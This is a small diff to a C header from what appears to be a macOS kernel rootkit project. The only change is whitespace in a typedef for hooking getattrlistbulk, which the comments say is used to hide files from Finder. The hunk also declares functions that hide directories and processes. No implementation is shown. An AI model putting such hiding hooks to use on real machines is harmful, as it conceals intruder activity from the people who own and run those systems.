@@ -94,8 +94,8 @@ typedef int (*getattrlist_function_prototype)(struct proc * p,
 //for hide file in finder
 //this function is a complete new funtion, and only support on Yousemite.
 typedef int (*getattrlistbulk_function_prototype)(proc_t p,
-                               struct getattrlistbulk_args *uap,
-                               int32_t *retval);
+                                                 struct getattrlistbulk_args *uap,
+                                                 int32_t *retval);
 
 int hide_given_directory(troy_hide_object *directory_hide);
 errno_t hide_given_process(troy_hide_object *process_hide);
